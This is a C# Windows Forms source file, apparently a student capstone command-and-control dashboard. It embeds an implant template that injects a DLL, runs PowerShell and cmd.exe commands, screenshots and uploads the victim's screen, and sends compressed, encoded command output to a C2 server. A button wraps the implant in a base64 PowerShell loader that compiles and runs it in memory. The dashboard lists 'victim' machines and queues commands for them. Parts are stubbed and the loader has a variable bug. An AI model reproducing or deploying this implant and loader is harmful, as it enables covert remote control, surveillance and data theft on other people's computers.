using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Windows.Forms;
using System.Data.SqlClient;
using MySql.Data.MySqlClient;
using Newtonsoft.Json;
using System.Net.Http;

namespace CapstoneInterface
{
    public partial class Dashboard : Form
    {
        public string operatorName { get; set; }
        public string userToControl { get; set; }

        public String templatePayload = @"
               using System;
                using System.Collections.Generic;
                using System.IO;
                using System.Linq;
                using System.Net;
                using System.Text;
                using System.Threading.Tasks;
                using System.Diagnostics;
                using System.Xml;

                using Newtonsoft.Json;
                using System.IO.Compression;

                namespace FirstAgentCapstone
                {
                    internal class Program
                    {


                        public static void Main(string[] args)
                        {
                            Modules.CalcRunner.Calc();
                            Modules.InjectDLL.RunDLL(""D:\\Deving\\Capstone\\CalcSpawner.dll"");
                            string commandPowerStar = args[0];
                            Modules.PowerStar.RunPS(commandPowerStar);
                            string filePath = Modules.ScreenShot.ScreenShotGetter();
                            Modules.Uploade.UploadFile(filePath);
                            fetchCommand();
                        }

                        public static string Base64Encode(string plainText)
                        {
                            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
                            return System.Convert.ToBase64String(plainTextBytes);
                        }

                        public static void fetchCommand()
                        {
                            var prepend_day = DateTime.Now.Date.Day.ToString() + ""-""
                                + DateTime.Now.Date.Month.ToString() + ""-""
                                + DateTime.Now.Date.Year.ToString() + ""_""
                                + DateTime.Now.Hour.ToString() + ""-""
                                + DateTime.Now.Minute.ToString() + ""-""
                                + DateTime.Now.Second.ToString();


                            var httpWebRequest = (HttpWebRequest)WebRequest.Create(""http://127.0.0.1:8080/fetchOutput"");
                            httpWebRequest.ContentType = ""application/json"";
                            httpWebRequest.Method = ""POST"";

                            using (var streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
                            {
                                string jsonId = ""{\""Id\"" : \"""" + prepend_day + ""\""}"";

                                Process process = new Process();
                                process.StartInfo.FileName = ""cmd.exe"";
                                process.StartInfo.Arguments = ""/c dir"";
                                process.StartInfo.UseShellExecute = false;
                                process.StartInfo.RedirectStandardOutput = true;
                                process.Start();

                                string output = process.StandardOutput.ReadToEnd().ToString();

                                byte[] bytes = Encoding.ASCII.GetBytes(output); 
                                byte[] cmdOutput = Compress(bytes);

                                string String = Encoding.UTF8.GetString(cmdOutput);
                                string encodedStr = Base64Encode(String);

                                process.WaitForExit();

                                var jsonData = ""{"" +
                                                        ""\n\t\""Id\"" : \"""" + prepend_day + ""\""\n"" +
                                                        ""\t\""Output\"" : \"""" + encodedStr + ""\""\n"" + 
                                               ""}"";

                                string jsonComplete = Base64Encode(jsonData);
                                Console.WriteLine(jsonComplete);

                                streamWriter.Write(jsonComplete);
                                streamWriter.Flush();
                                streamWriter.Close();
                            }

                            var httpResponse = (HttpWebResponse)httpWebRequest.GetResponse();
                            using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
                            {
                                var result = streamReader.ReadToEnd();
                                Console.WriteLine(result);
                            }
                        }

                        public static byte[] Compress(byte[] bytes)
                        {
                            using (var memoryStream = new MemoryStream())
                            {
                                using (var gzipStream = new GZipStream(memoryStream, CompressionLevel.Optimal))
                                {
                                    gzipStream.Write(bytes, 0, bytes.Length);
                                }
                                return memoryStream.ToArray();
                            }
                        }
                    }
                }

            ";
        public DataGridView Dgv { get; set; }
        public class Command
        {
            public string Input { get; set; }
            public string ImplantUser { get; set; }
            public string Operator { get; set; }
            public string timeToExec { get; set; }
            public string delay { get; set; }
        }
        public class User
        {
            [JsonProperty("Victim.username")]
            public string Username { get; set; }

            [JsonProperty("Network.ip_address")]
            public string Network { get; set; }

            [JsonProperty("Operating_System.name")]
            public string OperatingSystem { get; set; }

            [JsonProperty("CPU.architecture")]
            public string CPU { get; set; }

            [JsonProperty("GPU.information")]
            public string GPU { get; set; }

            [JsonProperty("RAM.amount")]
            public string RAM { get; set; }

            [JsonProperty("Storage.amount")]
            public string Storage { get; set; }
        }

        public Dashboard()
        {
            InitializeComponent();
        }

        private void txtConsoleOutput_TextChanged(object sender, EventArgs e)
        {

        }

        private void btnConsole_Click(object sender, EventArgs e)
        {

        }

        private void btnProcesses_Click(object sender, EventArgs e)
        {

        }

        private async void btnRunCommand_Click(object sender, EventArgs e)
        {
            // Iterate through the DataGridView rows
            foreach (DataGridViewRow row in dataGridView1.Rows)
            {
                // Get the value of the check box cell
                bool isChecked = Convert.ToBoolean(row.Cells["Check"].Value);

                // Check if the check box is checked
                if (isChecked)
                {
                    // Do something with the checked row
                    userToControl = row.Cells["Username"].Value.ToString();
                }
            }

            String lsOutput = @"
                Directory: C:\


                Mode                 LastWriteTime         Length Name
                ----                 -------------         ------ ----
                d-----         1/11/2023  12:42 PM                $WINDOWS.~BT
                d-----         1/11/2023  12:48 PM                ESD
                d-----        11/24/2022   9:38 PM                inetpub
                d-----          9/6/2022   2:22 PM                Microsoft
                d-----          5/7/2022   1:24 AM                PerfLogs
                d-r---         4/18/2023   6:00 PM                Program Files
                d-r---         3/24/2023   1:18 AM                Program Files (x86)
                d-----          4/1/2023   6:18 PM                Riot Games
                d-----         3/23/2023   8:11 PM                TeamCity
                d-----         7/23/2022   6:03 PM                temp
                d-r---        11/25/2022  12:20 AM                Users
                d-----         4/12/2023  11:00 PM                Windows
                d-----         11/5/2022  12:05 PM                XboxGames
                -a----         6/17/2022   7:36 PM                12288 DumpStack.log
                -a----         8/30/2022  11:49 AM             2  fdni.conf
                ";
            String command = txtCommand.Text;

            Command commandForImplant = new Command();

            if (command == "ls")
            {
                String userCommand = @"
                " + operatorName + " (04/25)> ls " +
                " " + operatorName + " sent 'ls' command to '" + userToControl + "'";

                txtConsoleOutput.Text = userCommand;

                Thread.Sleep(5000);

                commandForImplant.Input = command;
                commandForImplant.ImplantUser = userToControl;
                commandForImplant.Operator = operatorName;
                commandForImplant.timeToExec = "0";
                commandForImplant.delay = "0";


                dynamic jsonCommand = JsonConvert.SerializeObject(commandForImplant);

                txtImplantCode.Text = jsonCommand;

                HttpClient client = new HttpClient();
                var content = new StringContent(jsonCommand, Encoding.UTF8, "application/json");
                var response = await client.PutAsync("http://127.0.0.1:8080/fetchCommand", content);

            }
            else
            {
                txtConsoleOutput.Text = "";
            }

            txtConsoleOutput.Text += lsOutput;
        }

        private void dataGridView1_CellContentClick(object sender, DataGridViewCellEventArgs e)
        {
        }

        private async void button1_Click(object sender, EventArgs e)
        {
            HttpClient client = new HttpClient();
            HttpResponseMessage response = await client.GetAsync("http://127.0.0.1:8080/getClients");

            List<User> devices = null;

            if (response.IsSuccessStatusCode)
            {
                string json = await response.Content.ReadAsStringAsync();
                dynamic jsonObj = JsonConvert.DeserializeObject(json);

                devices = JsonConvert.DeserializeObject<List<User>>(json);
            }
            else
            {
                Console.WriteLine("Error: " + response.StatusCode);
            }

            // Create a new DataGridViewCheckBoxColumn
            DataGridViewCheckBoxColumn checkColumn = new DataGridViewCheckBoxColumn();
            checkColumn.HeaderText = "Check";
            checkColumn.Width = 30;
            checkColumn.Name = "Check";
            checkColumn.FlatStyle = FlatStyle.Standard;
            checkColumn.CellTemplate = new DataGridViewCheckBoxCell(false);

            // Add the check column to the DataGridView
            dataGridView1.Columns.Insert(0, checkColumn);

            dataGridView1.AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.Fill;
            // Now you can bind the list to the Data Grid View
            dataGridView1.DataSource = devices;
        }

        private async void btnGetData_ClickAsync(object sender, EventArgs e)
        {
            HttpClient client = new HttpClient();
            HttpResponseMessage response = await client.GetAsync("http://127.0.0.1:8080/getClients");

            List<User> devices = null;

            if (response.IsSuccessStatusCode)
            {
                string json = await response.Content.ReadAsStringAsync();
                dynamic jsonObj = JsonConvert.DeserializeObject(json);

                devices = JsonConvert.DeserializeObject<List<User>>(json);
            }
            else
            {
                Console.WriteLine("Error: " + response.StatusCode);
            }

            dataGridView2.AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.Fill;
            // Now you can bind the list to the Data Grid View
            dataGridView2.DataSource = devices;
        }

        private void btnPayloadGenerate_Click(object sender, EventArgs e)
        {
            txtPayloadGen.Text = templatePayload;
        }

        private void btnBundlePayload_Click(object sender, EventArgs e)
        {
            txtPayloadGen.Text = "";
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(templatePayload);
            var b64encodedPayload = System.Convert.ToBase64String(plainTextBytes);
            var powerShellNETLoader = @"
            $encodedSource = '" + b64encodedPayload + @"'
            $source = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($source))
            $provider = New-Object Microsoft.CSharp.CSharpCodeProvider
            $compiler = $provider.CreateCompiler()
            $parameters = New-Object System.CodeDom.Compiler.CompilerParameters
            $parameters.GenerateInMemory = $True

            $results = $compiler.CompileAssemblyFromSource($parameters, $source)
            if ($results.Errors.Count -eq 0) {
                $assembly = $results.CompiledAssembly
                $method = $assembly.EntryPoint
                $method.Invoke($null,$null)
            } else {
                $results.Errors | % { Write-Host $_.ErrorText }
            }";

            txtPayloadGen.Text += powerShellNETLoader;
        }

        private void Dashboard_Load(object sender, EventArgs e)
        {
            txtImplantCode.ScrollBars = ScrollBars.Vertical;
            txtConsoleOutput.ScrollBars = ScrollBars.Vertical;
            txtPayloadGen.ScrollBars = ScrollBars.Vertical;

            txtImplantCode.Text = templatePayload.ToString();
            lblOperator.Text = operatorName;
        }

        private void btnEditImplant_Click(object sender, EventArgs e)
        {
            if(txtImplantCode.Text != templatePayload.ToString()) { 
                templatePayload = txtImplantCode.Text;
            }
        }

        private void txtImplantCode_TextChanged(object sender, EventArgs e)
        {

        }
    }
}
